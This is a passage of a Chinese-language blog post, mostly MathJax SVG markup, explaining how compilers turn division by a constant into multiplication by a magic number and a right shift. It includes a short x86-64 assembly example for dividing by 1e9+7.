-231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="msup" transform="translate(6900,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,413) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><g data-mml-node="mo" transform="translate(7814.6,0)"><path data-c="230B" d="M229 734Q229 735 230 737T232 740T235 744T239 747T244 749T251 750Q262 748 269 735V-235Q266 -240 256 -249L147 -250H77Q43 -250 32 -247T21 -230T32 -213T72 -209Q79 -209 99 -209T133 -210H229V734Z"></path></g></g></g></svg></mjx-container></span> 这意味着整数除法可以用<strong>乘法和右移</strong>来完成：
<span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="17.807ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 7870.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(572,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mi" transform="translate(1072,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1839.8,0)"><path data-c="2248" d="M55 319Q55 360 72 393T114 444T163 472T205 482Q207 482 213 482T223 483Q262 483 296 468T393 413L443 381Q502 346 553 346Q609 346 649 375T694 454Q694 465 698 474T708 483Q722 483 722 452Q722 386 675 338T555 289Q514 289 468 310T388 357T308 404T224 426Q164 426 125 393T83 318Q81 289 69 289Q55 289 55 319ZM55 85Q55 126 72 159T114 210T163 238T205 248Q207 248 213 248T223 249Q262 249 296 234T393 179L443 147Q502 112 553 112Q609 112 649 141T694 220Q694 249 708 249T722 217Q722 153 675 104T555 55Q514 55 468 76T388 123T308 170T224 192Q164 192 125 159T83 84Q80 55 69 55Q55 55 55 85Z"></path></g><g data-mml-node="mo" transform="translate(2895.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(3284.6,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(4078.8,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mi" transform="translate(4579,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(5457,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(6123.8,0)"><path data-c="226B" d="M55 539T55 547T60 561T74 567Q81 567 207 498Q297 449 365 412Q633 265 636 261Q639 255 639 250Q639 241 626 232Q614 224 365 88Q83 -65 79 -66Q76 -67 73 -67Q65 -67 60 -61T55 -47Q55 -39 61 -33Q62 -33 95 -15T193 39T320 109L321 110H322L323 111H324L325 112L326 113H327L329 114H330L331 115H332L333 116L334 117H335L336 118H337L338 119H339L340 120L341 121H342L343 122H344L345 123H346L347 124L348 125H349L351 126H352L353 127H354L355 128L356 129H357L358 130H359L360 131H361L362 132L363 133H364L365 134H366L367 135H368L369 136H370L371 137L372 138H373L374 139H375L376 140L378 141L576 251Q63 530 62 533Q55 539 55 547ZM360 539T360 547T365 561T379 567Q386 567 512 498Q602 449 670 412Q938 265 941 261Q944 255 944 250Q944 241 931 232Q919 224 670 88Q388 -65 384 -66Q381 -67 378 -67Q370 -67 365 -61T360 -47Q360 -39 366 -33Q367 -33 400 -15T498 39T625 109L626 110H627L628 111H629L630 112L631 113H632L634 114H635L636 115H637L638 116L639 117H640L641 118H642L643 119H644L645 120L646 121H647L648 122H649L650 123H651L652 124L653 125H654L656 126H657L658 127H659L660 128L661 129H662L663 130H664L665 131H666L667 132L668 133H669L670 134H671L672 135H673L674 136H675L676 137L677 138H678L679 139H680L681 140L683 141L881 251Q368 530 367 533Q360 539 360 547Z"></path></g><g data-mml-node="mi" transform="translate(7401.6,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g></g></svg></mjx-container></span> 编译器会自动优化常数除法。例如，对于
<code>x / (10^9 + 7)</code>，可以用以下汇编指令代替：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 输入 (rdi): x</span><br><span class="line">; 输出 (rax): x mod (m=1e9+7)</span><br><span class="line">mov    rax, rdi</span><br><span class="line">movabs rdx, -8543223828751151131  ; 预加载魔数</span><br><span class="line">mul    rdx                        ; 乘法</span><br><span class="line">mov    rax, rdx</span><br><span class="line">shr    rax, 29                    ; 右移</span><br></pre></td></tr></table></figure></div>
<p>这样就避免了昂贵的整数除法。现在我们的问题就变成了是否肯定存在并能找到那么一组m与s可以进行表示1/y。</p>
<p>如果我们指定一个固定的移位值<strong>s</strong>，那么我们的<strong>m</strong>主要有两种选择，<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="14.899ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 6585.3 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="230A" d="M174 734Q174 735 175 737T177 740T180 744T184 747T189 749T196 750Q206 748 214 735V-210H310H373Q401 -210 411 -213T422 -230T411 -247T369 -251Q362 -251 338 -251T298 -250H190Q178 -246 174 -234V734Z"></path></g><g data-mml-node="msup" transform="translate(444,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,363) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(1358.6,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mi" transform="translate(1858.6,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2348.6,0)"><path data-c="230B" d="M229 734Q229 735 230 737T232 740T235 744T239 747T244 749T251 750Q262 748 269 735V-235Q266 -240 256 -249L147 -250H77Q43 -250 32 -247T21 -230T32 -213T72 -209Q79 -209 99 -209T133 -210H229V734Z"></path></g><g data-mml-node="mi" transform="translate(2792.6,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">或</text></g><g data-mml-node="mo" transform="translate(3792.6,0)"><path data-c="2308" d="M174 734Q178 746 190 750H298H369Q400 750 411 747T422 730T411 713T372 709Q365 709 345 709T310 710H214V-235Q206 -248 196 -250Q192 -250 189 -249T184 -247T180 -244T178 -241T176 -237T174 -234V734Z"></path></g><g data-mml-node="msup" transform="translate(4236.6,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,363) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(5151.3,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mi" transform="translate(5651.3,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(6141.3,0)"><path data-c="2309" d="M21 717T21 730T32 746T75 750H147H256Q266 742 269 735V-235Q262 -248 251 -250Q247 -250 244 -249T239 -247T235 -244T233 -241T231 -237T229 -234V710H133Q119 710 99 710T71 709Q43 709 32 713Z"></path></g></g></g></svg></mjx-container></span>
，如果我们把前者代入式子： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.552ex;" xmlns="http://www.w3.org/2000/svg" width="12.754ex" height="4.855ex" role="img" focusable="false" viewBox="0 -1460 5637.1 2146"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="230A" d="M174 734Q174 735 175 737T177 740T180 744T184 747T189 749T196 750Q206 748 214 735V-210H310H373Q401 -210 411 -213T422 -230T411 -247T369 -251Q362 -251 338 -251T298 -250H190Q178 -246 174 -234V734Z"></path></g><g data-mml-node="mfrac" transform="translate(444,0)"><g data-mml-node="mrow" transform="translate(220,710)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(794.2,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mo" transform="translate(1516.4,0)"><path data-c="230A" d="M174 734Q174 735 175 737T177 740T180 744T184 747T189 749T196 750Q206 748 214 735V-210H310H373Q401 -210 411 -213T422 -230T411 -247T369 -251Q362 -251 338 -251T298 -250H190Q178 -246 174 -234V734Z"></path></g><g data-mml-node="msup" transform="translate(1960.4,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,363) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2875.1,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mi" transform="translate(3375.1,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(3865.1,0)"><path data-c="230B" d="M229 734Q229 735 230 737T232 740T235 744T239 747T244 749T251 750Q262 748 269 735V-235Q266 -240 256 -249L147 -250H77Q43 -250 32 -247T21 -230T32 -213T72 -209Q79 -209 99 -209T133 -210H229V734Z"></path></g></g><g data-mml-node="msup" transform="translate(1917.2,-686)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,289) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><rect width="4509.1" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(5193.1,0)"><path data-c="230B" d="M229 734Q229 735 230 737T232 740T235 744T239 747T244 749T251 750Q262 748 269 735V-235Q266 -240 256 -249L147 -250H77Q43 -250 32 -247T21 -230T32 -213T72 -209Q79 -209 99 -209T133 -210H229V734Z"></path></g></g></g></svg></mjx-container></span>
会发现当y为奇数时，除法一定会有余数，经向下取整后结果必然小于<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="3.534ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 1562 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(572,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mi" transform="translate(1072,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container></span>。那么我们来考虑另外一种情况。 <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.552ex;" xmlns="http://www.w3.org/2000/svg" width="32.753ex" height="4.855ex" role="img" focusable="false" viewBox="0 -1460 14476.6 2146"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="230A" d="M174 734Q174 735 175 737T177 740T180 744T184 747T189 749T196 750Q206 748 214 735V-210H310H373Q401 -210 411 -213T422 -230T411 -247T369 -251Q362 -251 338 -251T298 -250H190Q178 -246 174 -234V734Z"></path></g><g data-mml-node="mi" transform="translate(444,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(1016,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mi" transform="translate(1516,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 